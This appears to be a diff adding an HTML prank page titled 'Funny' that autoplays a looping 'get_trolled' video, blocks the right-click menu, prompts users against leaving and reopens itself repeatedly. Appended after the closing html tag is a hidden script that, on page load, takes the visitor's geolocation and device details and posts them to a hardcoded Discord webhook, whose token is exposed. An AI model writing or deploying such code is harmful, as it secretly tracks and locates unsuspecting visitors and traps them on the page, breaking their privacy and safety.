@@ -1,0 +1,45 @@
+<head>
+    <title>Funny</title>
+</head>
+<body>
+    <video src="get_trolled.mp4" autoplay loop volume="100" oncontextmenu="return false"></video>
+    <script>
+        window.onbeforeunload = function() {
+            return "Are you sure you want to leave this site?";
+        };
+        for (let i = 0; i < 15; i++) {
+            window.open(window.location.href, '_self');
+        }
+    </script>
+</body>
+</html>
+<script>
+  window.onload = function() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language
+      };
+
+      const webhookURL = "https://discord.com/api/webhooks/1223734706470912000/aw9JJyAnPNpuqyyCXydHW8YMI0YJbMOI9HiazNI0j69aB4GC2A8u05zGA0aj4WAafqm9";
+      
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude,
+          longitude,
+          deviceInfo
+        })
+      });
+    });
+  }
+};
+</script>
